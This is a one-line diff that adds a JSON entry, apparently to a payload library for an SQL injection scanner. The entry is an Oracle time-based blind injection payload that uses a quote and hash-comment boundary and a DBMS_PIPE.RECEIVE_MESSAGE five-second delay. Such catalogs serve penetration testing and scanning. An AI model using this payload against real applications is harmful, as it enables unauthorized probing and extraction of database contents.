@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "time", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5))", "comment": "oracle time: single+enc hash"}
